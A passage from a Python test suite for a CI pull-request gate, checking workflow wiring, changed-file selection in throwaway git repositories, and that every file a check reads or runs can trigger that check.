    # while still being the value the gate diffs against.
    ALLOWED_REF = ('echo "ref=" >> "$GITHUB_OUTPUT"',
                   'echo "ref=origin/${BASE_REF}" >> "$GITHUB_OUTPUT"')
    ref_lines = [ln.strip() for ln in run_contents(wf)
                 if re.search(r'>>?\s*"?\$GITHUB_OUTPUT', ln)]
    check("the base the selection diffs against is the real base ref, or empty for a dispatch",
          ref_lines and all(ln in ALLOWED_REF for ln in ref_lines), ref_lines)
    for mutant in ('echo "ref=HEAD" >> "$GITHUB_OUTPUT"',
                   'echo "ref=origin/main" >> "$GITHUB_OUTPUT"'):
        check(f"that rule rejects a neutralised base: {mutant.split('=')[1].split(chr(34))[0]}",
              mutant not in ALLOWED_REF)

    # Derived from the matrix, not asserted as a constant: a check whose min_python exceeds the
    # runner reports MISSING-DEP, and a missing dependency *fails* the gate. The first version
    # asserted 3.10 (what sys.stdlib_module_names needs) while harness_suites declares 3.11, so
    # a runner satisfying the test would have failed the job it was meant to protect.
    # Shape first, because `max()` over mixed types raises and the f-string below is eager: writing
    # `min_python="3.11"` instead of `(3, 11)` aborted the suite at 415 of 503 with FAILS=0, the
    # traceback its only signal. `min_python=(3,)` was worse — it passed while silently lowering the
    # derived floor, and would make `floor[1]` an IndexError if it ever became the maximum.
    shapes = sorted({(c["name"], repr(c.get("min_python"))) for c in pr_gate.CHECKS
                     if c.get("min_python") is not None
                     and not (isinstance(c.get("min_python"), tuple)
                              and len(c["min_python"]) == 2
                              and all(isinstance(n, int) for n in c["min_python"]))})
    check("every min_python is a two-int tuple, so the floor derived from them cannot raise or come "
          "out short", not shapes, shapes)
    # The filter has to exclude the same shapes the rule above reports, *element types included* —
    # `("3", "11")` is a two-long tuple, so a container-and-length filter admitted it and `max()` over
    # `str` against `int` raised on the next line, discarding the 105 checks below the one that had just
    # named the problem correctly. Reporting a defect and then crashing on it is worse than either.
    def well_shaped(value):
        return (isinstance(value, tuple) and len(value) == 2
                and all(isinstance(n, int) for n in value))

    floor = max((c["min_python"] for c in pr_gate.CHECKS if well_shaped(c.get("min_python"))),
                default=(3, 0))
    # Read from the parsed document rather than off the raw text, which made an unquoted
    # `python-version: 3.13` — what a YAML formatter produces — parse as version 0.0 and blame the
    # matrix. Defaulted at every level: `gate_job` is `{}` when no single job runs the gate, and the
    # first spelling of this subscripted it, so a mutation that hid the gate job crashed the suite
    # here and skipped every check below instead of reporting the one that mattered.
    setup_with = next(((st.get("with") or {}) for st in (gate_job.get("steps") or [])
                       if st.get("name") == "Set up Python"), {})
    pinned = _dequote(str(setup_with.get("python-version", "")).strip())
    minor = re.match(r"^(\d+)\.(\d+)(?:\.\d+)?$", pinned)
    check("the runner's Python version is a literal this suite can compare against the floors — an "
          "expression (a matrix, a variable) is not one, and would be read as version 0.0",
          bool(minor), pinned)
    runner = (int(minor.group(1)), int(minor.group(2))) if minor else (0, 0)
    check(f"the runner meets the matrix's highest floor, {floor[0]}.{floor[1]}",
          runner >= floor, f"runner={runner}, floor={floor}")

    # Whole-file, not just the run lines: a `${{ }}` belongs on a `key: value` mapping line
    # (env:, group:, if:), never anywhere the shell sees it. Scanning parsed run bodies was the
    # weaker form — it could only reject what run_contents recognised, so a style it missed was
    # unexamined rather than rejected.
    injected = [ln for ln in strip_comments(wf).splitlines()
                if "${{" in ln and re.match(r"^\s*run:", ln)]
    injected += [ln for ln in run_contents(wf) if "${{" in ln]
    check("no shell line interpolates ${{ }}, so untrusted input arrives only via env",
          not injected, injected)
    for style, sample in (("single-line", '        run: echo "${{ github.event.number }}"\n'),
                          ("literal block", "        run: |\n          echo ${{ github.sha }}\n"),
                          ("folded block", "        run: >-\n          echo ${{ github.ref }}\n")):
        check(f"that rule sees a {style} run step, so it is not vacuous for one",
              [ln for ln in run_contents(sample) if "${{" in ln], sample)
    check("a token on an env: line is still allowed, or the rule would forbid the fix it wants",
          not [ln for ln in run_contents("          PR: ${{ github.event.number }}\n")
               if "${{" in ln])
else:
    check("pr-checks.yml exists to assert the gate is actually wired", False, "file missing")

print("\nSelection reads the merge base, so commits landed on the base after divergence "
      "do not enlarge it")
# Hermetic: a throwaway repo, so this asserts git behaviour rather than whatever the real
# repo happens to look like. A two-dot diff here would pick up base_only.txt and select
# checks for a file the pull request never touched.
def git(repo, *args):
    """Every call here mutates the fixture, so a failure must stop the run.

    The comment above promised hermeticity and nothing enforced it: each call site discarded the exit
    code, so a failed `init` — or a `TMPDIR` that itself sits inside a git repository — left `cwd`
    inside no repo of its own, and every following `add -A`, `commit` and `checkout -b` walked *up*
    into the enclosing one and rewrote the developer's history. Two reviewers ran into exactly that
    within one session, on this repository, and one of them also had a `git checkout` swap the
    workflow file underneath a running suite, which produced a measurement that had to be retracted.
    A promise of hermeticity has to be an assertion, so failures raise and the ceiling refuses any
    walk above the throwaway directory.
    """
    env = {**os.environ, "GIT_CEILING_DIRECTORIES": os.path.dirname(os.path.realpath(repo))}
    done = subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, env=env)
    if done.returncode:
        print("TOOL ERROR: fixture git %s failed in %s: %s"
              % (" ".join(args), repo, (done.stderr or done.stdout).strip()))
        raise SystemExit(2)
    return done


with tempfile.TemporaryDirectory() as repo:
    git(repo, "init", "-q", "-b", "base")
    top = git(repo, "rev-parse", "--show-toplevel").stdout.strip()
    check("the fixture repo is its own repository, not an enclosing one",
          os.path.realpath(top) == os.path.realpath(repo), (top, repo))
    git(repo, "config", "user.email", "t@example.com")
    git(repo, "config", "user.name", "t")
    open(os.path.join(repo, "seed.txt"), "w").write("seed\n")
    # Present on the base, so a later move reads as a deletion from it. Given a body, so
    # git's similarity detection actually fires — with a one-line file it falls back to
    # delete+add and the rename case is never exercised.
    os.makedirs(os.path.join(repo, "datasets", "sfdmu"), exist_ok=True)
    open(os.path.join(repo, "datasets", "sfdmu", "export.json"), "w").write(
        "\n".join(f'{{"object": "Obj{i}", "operation": "Upsert"}}' for i in range(40)))
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "seed")
    git(repo, "checkout", "-q", "-b", "feature")
    open(os.path.join(repo, "feature-change.md"), "w").write("feature work\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "feature work")
    git(repo, "checkout", "-q", "base")
    open(os.path.join(repo, "base_only.txt"), "w").write("landed after divergence\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-qm", "base moves on")
    git(repo, "checkout", "-q", "feature")

    saved_root = pr_gate.REPO_ROOT
    try:
        pr_gate.REPO_ROOT = repo
        files = pr_gate.changed_files("base")
        check("the feature's own change is selected", "feature-change.md" in files, files)
        check("a commit landed on the base after divergence is excluded",
              "base_only.txt" not in files, files)

        # A rename must report the source too. Git's default rename detection names only
        # the destination, so moving a plan README out of datasets/sfdmu/ would not select
        # the check that notices the plan lost its README.
        git(repo, "mv", "datasets/sfdmu/export.json", "moved-away.json")
        git(repo, "commit", "-qm", "move it out")
        files = pr_gate.changed_files("base")
        check("a rename reports the source path, not only the destination",
              "datasets/sfdmu/export.json" in files, files)
        check("...and the destination", "moved-away.json" in files, files)
        check("moving a file out of a directory still selects that directory's check",
              "plan_readme_consistency" in selected_names(files), selected_names(files))

        # Every extension the triggers can select, through the *real* `changed_files()`. Every other
        # rule about selection stubs this function, so a suffix filter inside it — `if not
        # f.endswith(".csv")` — hides the largest class of change in this repo (a dataset edit) while all
        # of them stay green. The filter has to be refused where it would live.
        suffixes = sorted({os.path.splitext(p)[1] for spec in pr_gate.CHECKS
                           for t in spec["triggers"] for p in [t.rstrip("/")] if os.path.splitext(p)[1]}
                          | {".csv", ".json", ".md", ".py", ".yml", ".xml", ".apex", ".robot"})
        os.makedirs(os.path.join(repo, "datasets", "sfdmu", "probe"), exist_ok=True)
        for i, suf in enumerate(suffixes):
            with open(os.path.join(repo, "datasets", "sfdmu", "probe", f"p{i}{suf}"), "w") as fh:
                fh.write("x\n")
        git(repo, "add", "-A")
        git(repo, "commit", "-qm", "one file per extension")
        files = pr_gate.changed_files("base")
        dropped = [suf for i, suf in enumerate(suffixes)
                   if f"datasets/sfdmu/probe/p{i}{suf}" not in files]
        check("changed_files() reports a changed path whatever its extension — the one place a suffix "
              "filter would hide a whole class of change from every other rule here",
              not dropped, dropped)

        # Non-ASCII paths: git quotes and escapes them unless -z is used, and a leading
        # quote matches no prefix.
        odd = os.path.join(repo, "docs")
        os.makedirs(odd, exist_ok=True)
        open(os.path.join(odd, "café.md"), "w").write("x\n")
        git(repo, "add", "-A")
        git(repo, "commit", "-qm", "non-ascii")
        files = pr_gate.changed_files("base")
        check("a non-ASCII path arrives unquoted and selects normally",
              any(f.endswith("café.md") for f in files), files)
        check("...and is not wrapped in quotes",
              not any(f.startswith('"') for f in files), files)

        # A wholly new, still-untracked directory. Plain `git status --porcelain` collapses
        # it to the topmost new directory ("brand-new/"), so the leaf file never reaches
        # selection: no .md suffix, no deeper prefix. The gate claims uncommitted work is
        # covered, so the collapse has to be defeated rather than documented.
        os.makedirs(os.path.join(repo, "brand-new", "guide"), exist_ok=True)
        open(os.path.join(repo, "brand-new", "guide", "page.md"), "w").write("# new\n")
        files = pr_gate.changed_files("base")
        check("a file inside a brand-new untracked directory reaches selection by full path",
              "brand-new/guide/page.md" in files, files)
        check("...and the collapsed directory entry is not what selection sees",
              "brand-new/" not in files, files)
        # The same collapse, now proved to change a verdict: this citation is wrong, and
        # doc_build_steps only sees it if the leaf path survives.
        open(os.path.join(repo, "brand-new", "guide", "page.md"), "w").write(
            "See step 99.99 of a flow that does not exist.\n")
        check("the new directory's markdown selects the build-step check",
              "doc_build_steps" in selected_names(pr_gate.changed_files("base")),
              selected_names(pr_gate.changed_files("base")))

        # A staged rename whose *source* path contains a space. With -z the source is its own
        # entry, carrying no `XY ` prefix, and the parser used to sniff for a space in the third
        # column: `ab cd/page.md` lost three characters and selected `cd/page.md` — a path that
        # does not exist — while the real one went unselected. Both halves of a rename are wanted,
        # because a check keyed on the old path (a doc citing it, a README listing it) has to run.
        os.makedirs(os.path.join(repo, "ab cd"), exist_ok=True)
        open(os.path.join(repo, "ab cd", "page.md"), "w").write("# spaced\n")
        git(repo, "add", "-A")
        git(repo, "commit", "-qm", "spaced path")
        git(repo, "mv", "ab cd/page.md", "renamed.md")
        files = pr_gate.changed_files("base")
        check("a renamed file's new path reaches selection", "renamed.md" in files, files)
        check("...and its old path arrives whole, not truncated at a space",
              "ab cd/page.md" in files and "cd/page.md" not in files, files)

        # Pinning the *argv* cannot cover the function that consumes its output. One line in
        # `changed_files` — `[p for p in diffed.split("\0") if not p.startswith("tests/")]` — excludes
        # a whole tree with no pathspec anywhere, and the argv pin above stays green because the argv
        # is untouched. That is a strictly stronger version of the threat the pin's own comment names.
        #
        # Derived from `CHECKS` rather than spelling `tests/`: the post-filter could name any tree, and
        # a fixture per tree someone thought of is the enumeration problem again.
        # Committed, not just written: uncommitted work reaches selection through
        # `git status --porcelain`, which is a different code path from the diff. Left untracked, the
        # probes were carried by the status path and a filter on the diff path survived this very
        # assertion — the fixture exercised the wrong half of the function it was written to cover.
        #
        # One probe per *trigger*, and this used to be one per top-level tree with
        # `if "/" in t and not t.startswith(".")` — which covered 12 of the 23 roots checks trigger on,
        # dropping every dot-tree, every top-level file, and `tui-cci`, a directory trigger spelled
        # without a trailing separator and so excluded for a third reason. Eleven differently-keyed
        # exclusions walked
        # past it, including `not p.startswith(".github/")` — which stops a workflow edit from selecting
        # the checks that guard the workflow, after which it can be edited freely. Others were keyed on
        # a suffix (`not p.endswith(".yml")`), a basename, a regex, or an exact path, so widening the
        # *tree* list would not have caught them either: a filter can key on anything, so the probe has
        # to be a path the trigger really selects, extension and all.
        probes = {}
        for spec in pr_gate.CHECKS:
            for trig in spec["triggers"]:
                # A directory trigger gets a file inside it; a file trigger *is* the path, since that is
                # the only probe a basename- or suffix-keyed filter cannot tell from the real thing.
                probes[trig] = (trig.rstrip("/") + "/probe_reaches_selection.md"
                                if trig.endswith("/") else trig)
        for path in sorted(set(probes.values())):
            os.makedirs(os.path.join(repo, os.path.dirname(path)) if os.path.dirname(path) else repo,
                        exist_ok=True)
            with open(os.path.join(repo, path), "w") as fh:
                fh.write("probe\n")
        git(repo, "add", "-A")
        git(repo, "commit", "-qm", "one file for every trigger any check names")
        files = pr_gate.changed_files("base")
        dropped = sorted({p for p in probes.values() if p not in files})
        check("every path a check triggers on survives the round trip out of changed_files, so no "
              "post-filter can exclude one — whether it keys on a tree, a dot-prefix, a suffix, a "
              "basename or an exact path — while the pinned argv stays intact",
              not dropped, f"dropped: {dropped}")
        # And selection has to agree: excluding a path one layer later, in `selects()`, is the same
        # threat moved down a function.
        unselected = sorted({(spec["name"], trig) for spec in pr_gate.CHECKS
                             for trig in spec["triggers"]
                             if not pr_gate.selects(spec, [probes[trig]])})
        check("and each of those paths selects the check that names it, so the exclusion cannot move "
              "from changed_files into selects()",
              not unselected, unselected)
    finally:
        pr_gate.REPO_ROOT = saved_root

print("\nEvery file a check reads can select that check")
# The absence hole one level up from a missing check: a check that runs, but not when the
# input it asserts against changes. Five of these shipped at once — a suite asserting that
# scripts/ai/README.md cites its current size while a README edit selected nothing; the
# CumulusCI pin compared against prepare-rlm-org.yml with that workflow untriggered; the
# "do not edit" generated references editable without the drift check; the manifest audit
# resolving paths repo-wide from a three-prefix trigger list; two suites reading skill and
# docs/references inputs outside their triggers. Each was invisible in the same way: the
# check passes, so nothing looks wrong. Enumerating the reads is what makes the sixth one
# fail loudly instead of joining quietly.
#
# Paths a suite names but does not depend on, so an unavoidable static-analysis false
# positive is a written decision rather than a loosened rule.
NOT_INPUTS = {
    "tests/test_pr_gate.py": {
        "datasets/sfdmu": "a path built inside a throwaway repo, not read from this one",
    },
    "tests/test_skill_manifest_audit.py": {
        # .agents/artifacts is gitignored, so it can never appear in a PR diff — nothing
        # there is selectable, which is the very asymmetry this suite exists to pin.
        ".agents/artifacts": "gitignored: cannot appear in a diff, so cannot select anything",
        ".agents/artifacts/integration-staging/pmos-integration.md": "gitignored",
    },
    "tests/test_fix_scratch_identity.py": {
        ".sf/orgs": "runtime org state, gitignored — not a repo input",
    },
    "tests/build_harness/test_tui_runner.py": {
        "orgs/ent.json": "a value in a stubbed load_cci dict, with runner.ROOT pointed at "
                         "tmp_path — never read from this repo",
    },
}


#: Names the suites use for the repository root. A single path segment counts as a read only
#: when it hangs off one of these: os.path.join(REPO, "tui-cci") is the root launcher, while
#: os.path.join(ERD_DIR, "README.md") is not the root README, and treating the two alike
#: reported both erd-count suites as reading a file they never touch.
#: Deliberately excludes a bare `root`, which the harness suites use for a tmp_path fixture
#: they write into — `root / "cumulusci.yml"` there is not this repo's cumulusci.yml.
ROOT_NAMES = {"REPO", "REPO_ROOT", "ROOT", "repo_root"}


def root_anchored(node):
    """Segments of a `REPO / "a" / "b"` chain, or () if it is not rooted at the repo."""
    segs = []
    while isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
        if not (isinstance(node.right, ast.Constant) and isinstance(node.right.value, str)):
            return ()
        segs.insert(0, node.right.value)
        node = node.left
    return tuple(segs) if isinstance(node, ast.Name) and node.id in ROOT_NAMES else ()


def named_paths(py_file, joins_only=False):
    """Repo-relative paths a source file names, from string constants and os.path.join()."""
    try:
        tree = ast.parse(pathlib.Path(py_file).read_text(encoding="utf-8"))
    except (OSError, SyntaxError):
        return set()
    found = set()
    # ast.walk visits the inner nodes of a `REPO / "scripts" / "ai" / "x.py"` chain too, and
    # each one is a valid rooted path — reporting the prefixes as separate reads.
    partial = {id(n.left) for n in ast.walk(tree)
               if isinstance(n, ast.BinOp) and isinstance(n.op, ast.Div)}
    # Constants that are *segments* of a path built elsewhere — `os.path.join(REPO, "docs", "erds",
    # "README.md")`, `tmp_path / "cumulusci.yml"`. The chain branches below already resolve those,
    # correctly and with their prefix. Only a standalone constant is a repo-relative path, so the
    # slash-free branch has to exclude segments or it reads the last one as a root-level file:
    # `docs/erds/README.md` became a claimed read of `README.md`, four times over.
    segments = {id(a) for n in ast.walk(tree) if isinstance(n, ast.Call)
                and isinstance(n.func, ast.Attribute) and n.func.attr == "join" for a in n.args}
    segments |= {id(n.right) for n in ast.walk(tree)
                 if isinstance(n, ast.BinOp) and isinstance(n.op, ast.Div)}
    for node in ast.walk(tree):
        if isinstance(node, ast.Constant) and isinstance(node.value, str) and not joins_only:
            if "/" in node.value and not node.value.startswith(("/", "http")):
                found.add(node.value.strip("/"))
            # A slash-free constant naming a real root-level **file** — `"AGENTS.md"`. The slash-only
            # rule made these invisible, so a suite reading one appeared to read nothing there and its
            # trigger could be deleted with this suite green. Measured worth: of the 95 triggers
            # across all checks, 14 were deletable-green before this branch and 13 after, so it fixed
            # exactly **one** (`sfdmu_csv_expectation` → `AGENTS.md`). An earlier version of this
            # comment said three; that number does not reproduce, and the remaining 13 are tracked
            # rather than claimed fixed.
            #
            # Files only. A directory was admitted here and then dropped by the return filter below,
            # which keeps a slash-free path only when it names a file — so `"tests"`, which this
            # comment once offered as an example, is not collected and cannot be. Naming the dead
            # half was worse than omitting it: it described a capability the function does not have.
            #
            # Shape-gated *before* touching the filesystem: every docstring in the file is a string
            # constant too, and `Path.exists()` on one raises `OSError: File name too long` rather
            # than returning False. The 64-char bound is load-bearing for that reason, not tidiness.
            # `.exists()` reads the working tree, so an untracked root file would be enumerated here
            # and not in CI; nothing names one today, and `git ls-files` is the fix if that changes.
            elif id(node) not in segments and re.fullmatch(r"[\w.\-]{1,64}", node.value):
                if (pathlib.Path(REPO) / node.value).is_file():
                    found.add(node.value)
        elif isinstance(node, ast.BinOp):
            # repo_root / "tui-cci" — a single root-level segment carries no slash to
            # recognise it by, so this read stayed invisible: the launcher had no trigger at
            # all and the mutation proving that survived.
            segs = root_anchored(node) if id(node) not in partial else ()
            if segs:
                found.add("/".join(segs))
        elif isinstance(node, ast.Call):
            # os.path.join(REPO, "a", "b") — the segments carry no slash of their own, so
            # the constant branch above cannot see this shape.
            fn = node.func
            if isinstance(fn, ast.Attribute) and fn.attr == "join" and node.args:
                segs = [a.value for a in node.args[1:]
                        if isinstance(a, ast.Constant) and isinstance(a.value, str)]
                rooted = (isinstance(node.args[0], ast.Name)
                          and node.args[0].id in ROOT_NAMES)
                if len(segs) == len(node.args) - 1 and segs and (len(segs) > 1 or rooted):
                    found.add("/".join(segs))
    # A lone root-level segment counts only when it names a file. `ROOT / "scripts"` is a
    # directory on its way to a longer path, not something a suite reads.
    return {p for p in found
            if "/" in p or os.path.isfile(os.path.join(REPO, p))}


def check_sources(spec):
    """The test suites a check's command executes.

    Suites only, deliberately: running a suite runs everything in it, so every path it names
    is a path it reads. A script invoked with a subcommand (`skill_manifest.py --check`)
    exercises one branch, so its other paths — a report's output file, a table another
    subcommand renders — would be false positives. Those checks get the exact, data-driven
    gates below instead of a static read of the whole file.
    """
    # Off `SPLICED_SUITES`, for the reason spelled out on `suites_of` above: matching the two names
    # here made a rename of either check silently return nothing at all.
    spliced = pr_gate.SPLICED_SUITES.get(spec["name"])
    if spliced is not None:
        return list(spliced)
    if spec["cmd"] is None:
        return []
    sources = []
    for arg in spec["cmd"][1:]:
        if arg.endswith(".py") and arg.startswith("tests/"):
            sources.append(arg)
        elif os.path.isdir(os.path.join(REPO, arg)):
            # A directory argument is ~30 suites plus their conftest.py. Skipping it — the
            # first version of this function did, having only matched names ending in .py —
            # left every nested harness suite outside the guarantee, which is how the root
            # `tui-cci` launcher came to be read by a test that no check selected.
            for root, _dirs, files in os.walk(os.path.join(REPO, arg)):
                sources += [os.path.relpath(os.path.join(root, f), REPO)
                            for f in files if f.endswith(".py")]
    return sources


def as_change(rel):
    """A directory named as an input stands for a change underneath it."""
    return rel + "/probe" if os.path.isdir(os.path.join(REPO, rel)) else rel


SELF = "tests/test_pr_gate.py"
unselected_reads, inspected = [], 0
for spec in pr_gate.CHECKS:
    for src in check_sources(spec):
        declared = NOT_INPUTS.get(src, {})
        # This suite is *about* selection, so nearly every path it names is a fixture — an
        # expected trigger, a probe, content written into a throwaway repo. Enumerating those
        # produced a declaration list that grew with every assertion added, which is the drift
        # this gate is supposed to prevent, not cause. Every real read here goes through
        # os.path.join(REPO, …), so that shape is the enumeration, and the check below refuses
        # a read written any other way.
        for rel in sorted(named_paths(os.path.join(REPO, src), joins_only=(src == SELF))):
            inspected += 1
            if rel in declared or not os.path.exists(os.path.join(REPO, rel)):
                continue
            if not pr_gate.selects(spec, [as_change(rel)]):
                unselected_reads.append(f"{spec['name']} reads {rel} ({src}) but is not "
                                        f"selected by it")
check("no suite reads a file that cannot select it", not unselected_reads,
      "; ".join(unselected_reads[:8]))
check("the enumeration actually inspected something", inspected > 20, inspected)

# The other direction of the same rule: a check must also be selected by the script it *runs*.
# The enumeration above walks each check's test-suite sources, so for the two checks whose
# command is a validator rather than a suite it saw nothing — and both were editable without
# the check that executes them running, leaving only a syntax scan between a semantic
# regression in a validator and a merge.
def unrun_commands(specs):
    out = []
    for spec in specs:
        for arg in (spec["cmd"] or [])[1:]:
            if (arg.endswith((".py", ".sh")) and os.path.isfile(os.path.join(REPO, arg))
                    and not pr_gate.selects(spec, [arg])):
                out.append(f"{spec['name']} runs {arg} but is not selected by it")
    return out


check("no check runs a script that cannot select it", not unrun_commands(pr_gate.CHECKS),
      "; ".join(unrun_commands(pr_gate.CHECKS)))
# Positive control: with the matrix correct, blinding the rule above yields the same empty
# result, so the assertion alone cannot tell a held property from an unexercised one.
check("that rule can actually detect a violation",
      unrun_commands([dict(name="probe", cmd=["python", "scripts/ai/pr_gate.py"],
                           triggers=["datasets/"])]) != [])
# Coverage of the enumeration itself, which the failure above cannot assert: a shape it stops
# recognising silently narrows the guarantee instead of failing. Both shapes below were blind
# spots that let a real missing trigger through — the nested suites reached only via a
# directory argument, and the root launcher named as a single rooted segment.
enumerated = {s for spec in pr_gate.CHECKS for s in check_sources(spec)}
check("the enumeration reaches suites named only by a directory argument",
      "tests/build_harness/test_tui_launcher.py" in enumerated)
check("a single root-level segment is recognised as a read",
      "tui-cci" in named_paths(os.path.join(REPO, "tests/build_harness/test_tui_launcher.py")))
# The two rooted single-segment shapes, told apart: a root *file* is a read, a root directory
# is the start of a longer path. Asserted on a synthetic source because no suite currently
# writes the directory form, so the distinction is otherwise unobservable.
shapes = tempfile.NamedTemporaryFile("w", suffix=".py", delete=False)
shapes.write('a = os.path.join(REPO, "tui-cci")\nb = os.path.join(REPO, "scripts")\n')
shapes.close()
try:
    shape_reads = named_paths(shapes.name)
    check("a rooted root-file segment counts as a read", "tui-cci" in shape_reads)
    check("a rooted root-directory segment does not", "scripts" not in shape_reads, shape_reads)
finally:
    os.unlink(shapes.name)

# The convention the joins_only narrowing above depends on: a read written as
# open("docs/x.md") in this file would be invisible to the enumeration, so it is refused
# outright rather than left as a quiet exemption.
self_src = "\n".join(
    ln for ln in pathlib.Path(os.path.join(REPO, SELF)).read_text(
        encoding="utf-8").splitlines()
    if not ln.lstrip().startswith("#"))  # the comment above names the shape it forbids
bare_reads = re.findall(r'(?:open|read_text|Path)\(\s*"[^"]*/[^"]*"', self_src)
check("this suite reads repo files only through os.path.join(REPO, …)",
      not bare_reads, bare_reads)

# agent_tooling asserts these files exist, so deleting one must select it. Read back out of
# the script for the same reason as the manifest roots below: a hand-kept copy drifts.
tooling_src = pathlib.Path(
    os.path.join(REPO, "scripts", "ai", "analyze_agent_tooling.py")).read_text()
required = []
for const in ("REQUIRED_FILES", "GENERATED_CCI_REFERENCE_FILES", "BASELINE_EXTRA_FILES"):
    block = re.search(rf"^{const} = \[(.*?)\]", tooling_src, re.S | re.M)
    check(f"analyze_agent_tooling.py still declares {const}", block is not None)
    required += re.findall(r'"([^"]+)"', block.group(1) if block else "")
tooling_check = check_named("agent_tooling")
check("the agent_tooling check still exists under that name", tooling_check is not None)
check("the required-file list is non-trivial", len(required) > 8, len(required))
# `check_named` returns None rather than raising, but the line after each call used to dereference it
# anyway — `selects(None, …)` subscripts None and aborts the suite one check *after* reporting the
# finding, which discards every later check including the count invariant. A missing check now reads as
# "nothing selects it", so the finding is reported twice and the run continues.
missed_required = ([r for r in required if not pr_gate.selects(tooling_check, [r])]
                   if tooling_check else list(required))
check("every file agent_tooling asserts the presence of can select it",
      not missed_required, missed_required)

# The manifest audit resolves paths anywhere under its own declared roots, so the trigger
# list is read back out of the script rather than kept in step by hand.
manifest_src = pathlib.Path(os.path.join(REPO, "scripts", "ai", "skill_manifest.py")).read_text()
roots = re.search(r"_PATH_ROOTS = \((.*?)\)", manifest_src, re.S)
root_files = re.search(r"_ROOT_FILES = \((.*?)\)", manifest_src, re.S)
check("skill_manifest.py still declares the roots it audits",
      roots is not None and root_files is not None)
audited = [v for v in re.findall(r'"([^"]+)"', (roots.group(1) if roots else "")
                                 + (root_files.group(1) if root_files else ""))]
check("the audited root list is non-trivial", len(audited) > 15, len(audited))
manifest_check = check_named("skill_manifest")
check("the skill_manifest check still exists under that name", manifest_check is not None)
missed_roots = ([r for r in audited
                 if not pr_gate.selects(manifest_check, [r.rstrip("/") + "/probe.md"
                                                         if r.endswith("/") else r])]
                if manifest_check else list(audited))
check("every root the manifest audit resolves can select the manifest check",
      not missed_roots, missed_roots)

print("\nThe CCI reference drift check watches only what the generator writes")
src = open(os.path.join(REPO, "scripts", "ai", "pr_gate.py")).read()
check("the drift scope names the three generated files",
      all(n in src for n in ("tasks-reference.md", "flows-reference.md",
                             "feature-flags.md")))
# Scoped to the function, not the file: docs/references/ is a legitimate trigger elsewhere
# (a suite validates a shipped example under it), so a whole-file search would conflate the
# two and pass or fail for the wrong reason.
drift_body = body_of(src, "def run_cci_reference_drift", "the drift check")
drift_code = "\n".join(ln for ln in drift_body.splitlines()
                       if not ln.lstrip().startswith("#"))
check("the drift scope no longer includes hand-authored docs/references/",
      "docs/references/" not in drift_code,
      "generate_cci_reference.py writes only to .cursor/skills/cci-orchestration/")
# This check adjudicates hand edits to files that carry a "do not edit" banner, so each of
# them has to be able to select it. Not reachable by the read-enumeration above: the scope
# lives inside a cmd=None runtime branch, which is exactly where an ungated input hides.
drift_check = check_named("cci_reference_drift")
check("the cci_reference_drift check still exists under that name", drift_check is not None)
drift_scope = [f".cursor/skills/cci-orchestration/{n}"
               for n in re.findall(r'"([^"]+\.md)"', drift_code)]
check("the drift scope was parsed out of the function", len(drift_scope) == 3, drift_scope)
unselecting = ([g for g in drift_scope if not pr_gate.selects(drift_check, [g])]
               if drift_check else list(drift_scope))
check("every generated file the drift check judges can select it", not unselecting,
      unselecting)
# Everything above reads the function's *text* — which filenames it scopes to, that it goes through
# `git()`. None of it asks whether the function can still return a failure. Adding one condition to the
# verdict (`if drift.strip() and os.environ.get("PR_GATE_STRICT_DRIFT")`) satisfied every one of those
# rules and made the check incapable of failing: the three filenames are present, `docs/references/` is
# absent, `git()` is still called. Driven here instead, with the generator stubbed out and dirty status
# injected, so the property asserted is the verdict rather than the shape of the code producing it.
real_run, real_git = pr_gate.run, pr_gate.git
try:
    pr_gate.run = lambda cmd: (0, "regenerated", 0.0)
    pr_gate.git = lambda argv, what: " M .cursor/skills/cci-orchestration/tasks-reference.md\n"
    dirty_code, dirty_out, _ = pr_gate.run_cci_reference_drift()
    pr_gate.git = lambda argv, what: ""
    clean_code, _, _ = pr_gate.run_cci_reference_drift()
finally:
    pr_gate.run, pr_gate.git = real_run, real_git
check("the drift check fails when the generator dirties a file it judges, so no added condition can "
      "leave it structurally correct and permanently green",
      dirty_code == 1 and "commit the result" in dirty_out, (dirty_code, dirty_out[-160:]))
check("and passes when the tree comes back clean, so the rule above is not simply always-fail",
      clean_code == 0, clean_code)

print("\nA dependency-blocked advisory check does not fail the gate")
listing = changed_list("zz_probe_path/thing.txt")
pr_gate.CHECKS.append(dict(name="zz_probe_advisory", cmd=["python", "-c", "pass"],
                           triggers=["zz_probe_path/"], deps=["pytest"], gating=False,
                           note="probe"))
saved = dict(pr_gate.DEPS)
try:
    pr_gate.DEPS["pytest"] = "a_module_that_does_not_exist_anywhere"
    code, out = main_with(["--changed-files-from", listing])
    check("an advisory check blocked on a dependency does not fail the gate", code == 0, code)
    check("it is labelled ADVISORY-DEP rather than passed over", "ADVISORY-DEP" in out)
finally:
    pr_gate.DEPS.clear()
    pr_gate.DEPS.update(saved)
    pr_gate.CHECKS.pop()
    os.unlink(listing)

print("\nA check with no command and no resolve() branch is a tool error, not a verdict")
exit_code = None
try:
    pr_gate.resolve(dict(name="zz_probe_nocmd", cmd=None, triggers=[], deps=[],
                         gating=True))
except SystemExit as exc:
    exit_code = exc.code
check("an unresolvable check exits 2, not a traceback or a gating failure",
      exit_code == 2, exit_code)
# Derived, not listed. `requests_offline_suites` was missing from the hardcoded tuple, so of the two
# runtime-expanded bulk checks only one was guarded here — which is why deleting the other was caught
# by nothing. Every check whose argv is spliced in at runtime belongs in this loop by construction.
for name in ("cci_reference_drift", "yaml_offline_suites", *sorted(pr_gate.SPLICED_SUITES)):
    spec = check_named(name)
    check(f"{name} resolves to a runnable callable",
          spec is not None and callable(pr_gate.resolve(spec)))
# Callable is not enough: the map was guarded and its consumer was not. `resolve()` reads
# `SPLICED_SUITES[name]` and builds one command per suite, so slicing that list there —
# `[:0]` (run nothing) or `[:1]` (run one of N) — reported PASS for a check that ran no suites, while
# `_claimed_suites()` went on claiming all of them so `unlisted_suites()` saw nothing missing. Counting
# the commands the resolver actually produces is the property; a rule about the map cannot see it.
#
# Over every check, not only the `SPLICED_SUITES` ones. `yaml_offline_suites` splices from its own `cmd`
# rather than from the map, so keying this loop on the map left the one bulk check outside the map
# unguarded, and `[a for a in check["cmd"][1:]]` → `[1:2]` ran one of its four suites at 601/601.
#
# And over every *word*, not the last one. `[c[-1] for c in built]` compares the suite path and ignores
